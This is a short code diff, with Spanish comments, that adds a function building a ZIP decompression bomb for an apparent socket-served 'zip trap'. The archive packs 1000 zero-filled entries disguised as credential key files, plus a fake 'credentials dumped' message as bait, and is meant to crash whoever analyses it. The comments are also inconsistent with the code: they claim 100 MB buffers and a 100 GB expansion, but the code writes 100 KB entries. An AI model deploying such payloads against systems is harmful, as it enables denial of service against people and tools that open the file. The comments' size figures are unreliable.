@@ -23,6 +23,24 @@ def generate_ultra_zip():
 
     return zip_buffer.getvalue()
 
+def generate_stealth_bolt():
+    """
+    Genera una 'Stealth Bolt' de 1 Mb (125 KB).
+    Diseñada para ser descargada instantáneamente y colapsar el análisis posterior.
+    """
+    zip_buffer = io.BytesIO()
+    # Bloque de 100 KB de alta repetibilidad
+    kernel_data = b"\x00" * (1024 * 100)
+    
+    with zipfile.ZipFile(zip_buffer, 'a', zipfile.ZIP_DEFLATED) as zf:
+        # Generamos 1000 entradas que apuntan a buffers de 100MB cada uno
+        # Esto crea una expansión de 100 GB a partir de 1 Mb
+        for i in range(1000):
+            zf.writestr(f"SHADOW_CREDENTIALS_{i:04d}.key", kernel_data)
+        zf.writestr("HELL_AUTH_SUCCESS.txt", "SYSTEM ACCESS GRANTED. CREDENTIALS DUMPED.")
+
+    return zip_buffer.getvalue()
+
 def serve_zip_trap(client_socket):
     """Genera y sirve la bomba ZIP a través de un socket."""
     zip_data = generate_ultra_zip()
